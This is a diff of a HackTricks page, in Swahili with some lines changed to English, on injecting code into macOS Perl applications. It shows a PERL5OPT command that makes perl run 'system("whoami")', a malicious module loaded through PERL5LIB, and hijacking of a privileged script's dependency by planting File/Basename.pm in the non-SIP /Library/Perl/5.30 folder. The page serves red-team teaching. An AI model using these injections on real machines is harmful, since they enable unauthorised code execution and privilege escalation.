@@ -1,24 +1,24 @@
-# Uingizaji wa Maombi ya Perl kwenye macOS
+# macOS Perl Applications Injection
 
 {% hint style="success" %}
-Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Kupitia `PERL5OPT` & `PERL5LIB` env variable
 
-Kwa kutumia mazingira ya kipekee ya PERL5OPT, inawezekana kufanya perl itekeleze amri za kupindukia.\
-Kwa mfano, unda script hii:
+Kwa kutumia env variable PERL5OPT inawezekana kufanya perl itekeleze amri zisizo na mpangilio.\
+Kwa mfano, tengeneza script hii:
 
 {% code title="test.pl" %}
 ```perl
@@ -27,12 +27,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Sasa **tengeneza mazingira ya env** na tekeleza skripti ya **perl**:
+Sasa **safisha variable ya env** na uendeshe **perl** script:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-Chaguo lingine ni kuunda moduli ya Perl (k.m. `/tmp/pmod.pm`):
+Nyingine chaguo ni kuunda moduli ya Perl (mfano `/tmp/pmod.pm`):
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -43,13 +43,13 @@ system('whoami');
 ```
 {% endcode %}
 
-Na kisha tumia mazingira ya env:
+Na kisha tumia mabadiliko ya mazingira:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
-## Kupitia tegemezi
+## Via dependencies
 
-Inawezekana kuorodhesha folda za tegemezi kwa mpangilio wa Perl unapoendesha:
+Inawezekana kuorodhesha mpangilio wa folda za utegemezi wa Perl unaotumika:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
@@ -65,16 +65,31 @@ Ambayo itarudisha kitu kama:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Baadhi ya folda zilizorudishwa hazipo, hata hivyo, **`/Library/Perl/5.30`** ipo, haikilindwi na **SIP** na iko **kabla** ya folda zilizolindwa na SIP. Kwa hivyo, mtu anaweza kutumia folda hiyo kuongeza mahitaji ya script ili script ya Perl yenye mamlaka makubwa iweze kuijumuisha.
+Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo, **`/Library/Perl/5.30`** inapatikana **na** **sio** **ililindwa** na **SIP** na iko **kabla** ya folda **zilizolindwa** na **SIP**. Hivyo, mtu anaweza kutumia folda hiyo kuongeza utegemezi wa skripti ili skripti ya Perl yenye haki za juu iweze kuipakia.
 
 {% hint style="warning" %}
-Hata hivyo, kumbuka kwamba **unahitaji kuwa na ruhusa ya msingi kuandika kwenye folda hiyo** na siku hizi utapata **ombi la TCC** hili:
+Hata hivyo, kumbuka kuwa **unahitaji kuwa root kuandika katika folda hiyo** na siku hizi utapata **kipeperushi cha TCC**:
 {% endhint %}
 
 <figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Kwa mfano, ikiwa script inaingiza **`use File::Basename;`** ingewezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya iendeshe nambari ya kupendelea.
+Kwa mfano, ikiwa skripti inatumia **`use File::Basename;`** itakuwa inawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya itekeleze msimbo wa kiholela.
 
-## Marejeo
+## References
 
 * [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
